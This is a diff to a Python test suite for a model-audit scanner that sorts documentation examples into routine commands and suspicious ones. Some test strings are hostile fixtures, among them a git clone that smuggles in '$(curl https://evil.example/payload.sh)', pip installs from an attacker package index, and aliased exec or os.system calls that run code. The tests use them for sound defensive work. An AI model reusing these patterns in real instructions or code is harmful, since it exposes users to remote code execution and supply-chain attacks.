@@ -5284,6 +5284,10 @@ def _assert_requirements_actionable(tmp_path: Path, requirement_line: str) -> No
         "```bash\ngit clone --depth 1 https://github.com/owner/repo.git ./models/repo\n```\n",
         "```bash\ngit clone --depth=1 https://github.com/owner/repo.git\n```\n",
         "```bash\ngit clone -- https://github.com/owner/repo.git\n```\n",
+        "> ```bash\n> git clone https://github.com/owner/repo.git\n> ```\n",
+        "> > ```bash\n> > git clone https://github.com/owner/repo.git\n> > ```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git # clone into $HOME\n```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git # examples: $(pwd), `pwd`, pipes | and ;\n```\n",
         "```bash\ngit clone --branch=release --depth=1 -- https://github.com/owner/repo.git repo\n```\n",
         "```bash\npip install --extra-index-url=https://download.pytorch.org/whl/ torch\n```\n",
         "```bash\npython -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
@@ -5297,6 +5301,9 @@ def _assert_requirements_actionable(tmp_path: Path, requirement_line: str) -> No
         '```python\nfrom openai import OpenAI\nclient = OpenAI(\nbase_url="http://localhost:8000/v1",\napi_key="EMPTY",\n)\n```\n',
         '~~~py\nclient = OpenAI(base_url="http://127.0.0.1:8001/v1/")\n~~~\n',
         '```python\nclient = OpenAI(base_url="http://[::1]:8000/v1")\n```\n',
+        '> ```python\n> client = OpenAI(base_url="http://localhost:8000/v1")\n> ```\n',
+        '```python\nsystem = "You are helpful"\nclient = OpenAI(base_url="http://localhost:8000/v1")\n'
+        'messages = [{"role": "system", "content": system}]\n```\n',
         '```python\nclient = OpenAI(base_url=os.getenv("OPENAI_BASE_URL", "http://localhost:8000/v1"))\n```\n',
         '```python\nllm_cfg = {"model": "demo", "model_server": "http://localhost:8000/v1", "api_key": "EMPTY"}\n```\n',
         '```python\nmessages = [{"role": "user", "content": '
@@ -5342,6 +5349,8 @@ def test_routine_documented_examples_are_informational(tmp_path: Path, content: 
         "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_TOOLCHAIN_FILE=run.cmake",
         "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_USER_MAKE_RULES_OVERRIDE=run.cmake",
         "git clone https://github.com/owner/repo.git $(curl https://evil.example/payload.sh)",
+        "git clone https://github.com/owner/repo.git '# $HOME'",
+        "> git clone https://github.com/owner/repo.git",
         "git clone https://github.com/owner/repo.git\ncat <<EOF\npayload\nEOF",
         "uv pip install --extra-index-url https://evil.example/simple demo",
         "pip install --extra-index-url=https://evil.example/simple demo",
@@ -5403,6 +5412,18 @@ def test_documented_setup_preserves_suspicious_commands(tmp_path: Path, command:
         "Run <code>python repo/install.py</code> next.\n",
         "Run <code>./repo/install.py</code> next.\n",
         "Run python repo/install.py next.\n",
+        "Run: python repo/install.py next.\n",
+        "Run:python repo/install.py next.\n",
+        "Run: `./repo/install.py` next.\n",
+        "Run: <code>./repo/install.py</code> next.\n",
+        "Run`./repo/install.py` next.\n",
+        "Run<code>./repo/install.py</code> next.\n",
+        "Run — python repo/install.py next.\n",
+        "Execute:\npython repo/install.py next.\n",
+        ">     python repo/install.py\n",
+        "> >     python repo/install.py\n",
+        "> ```bash\n> python repo/install.py\n> ```\n",
+        "> ```bash\n> python repo/install.py\n",
         "Next, execute bash repo/install.sh to finish setup.\n",
         "Launch ./repo/install.py next.\n",
         'Run "python" repo/install.py next.\n',
@@ -5469,6 +5490,9 @@ def test_documented_clone_script_chains_across_blocks_remain_actionable(tmp_path
         "The `<pre><code>` tags display code examples.\n",
         "The &lt;pre&gt;&lt;code&gt; tags display code examples.\n",
         "Run python3 --version\n",
+        "Run: python3 --version\n",
+        "> ```bash\n> python3 --version\n> ```\n",
+        ">     python3 --version\n",
         "Run <b>python3</b> --version\n",
         "Run the example when you're ready.\n",
         "The source code is available in the cloned repository.\n",
@@ -5513,6 +5537,15 @@ def test_documented_client_preserves_suspicious_endpoints(tmp_path: Path, url: s
         'client = OpenAI(base_url=f"http://localhost:8000/v1{suffix}")',
         'client = OpenAI(base_url="http://localhost:8000/v1" + suffix)',
         'client = OpenAI(base_url="http://localhost:8000/v1")\nexec(source)',
+        'system = exec\nclient = OpenAI(base_url="http://localhost:8000/v1")\nsystem(source)',
+        'system = "data"\nsystem = os.system\nclient = OpenAI(base_url="http://localhost:8000/v1")\nsystem(source)',
+        'system = "data"\ndef run(system):\n    executor = system\n    executor(source)\n'
+        'client = OpenAI(base_url="http://localhost:8000/v1")',
+        'system = "data"\nglobals()["system"] = callback\nexecutor = system\nexecutor(source)\n'
+        'client = OpenAI(base_url="http://localhost:8000/v1")',
+        'executor = system\nsystem = "data"\nexecutor(source)\nclient = OpenAI(base_url="http://localhost:8000/v1")',
+        'def prompt():\n    system = "data"\nexecutor = system\nexecutor(source)\n'
+        'client = OpenAI(base_url="http://localhost:8000/v1")',
         'import subprocess as sp\nclient = OpenAI(base_url="http://localhost:8000/v1")\nsp.run(command)',
         'client = OpenAI(base_url="http://localhost:8000/v1"',
         'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/"}]\nexec(messages[0]["content"])',
@@ -5562,6 +5595,19 @@ def test_routine_examples_in_extensionless_markdown_model_cards_are_informationa
 )
 def test_routine_example_policy_requires_complete_bounded_fences(tmp_path: Path, content: str) -> None:
     _assert_documentation_network_actionable(tmp_path, content, "url_detected")
+
+
+def test_routine_example_policy_bounds_whole_document_analysis(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    from modelaudit.scanners.text_scanner_support import documentation_examples
+
+    def unexpected_parse(_payload: bytes) -> None:
+        pytest.fail("An oversized document reached Markdown parsing")
+
+    monkeypatch.setattr(documentation_examples, "_without_blockquote_prefixes", unexpected_parse)
+    content = "```bash\ngit clone https://github.com/owner/repo.git\n```\n" + "x" * (
+        documentation_examples.MAX_DOCUMENTATION_BYTES + 1
+    )
+    _assert_documentation_network_actionable(tmp_path, content, "network_command")
 
 
 def test_routine_example_does_not_hide_later_same_url_execution(tmp_path: Path) -> None:
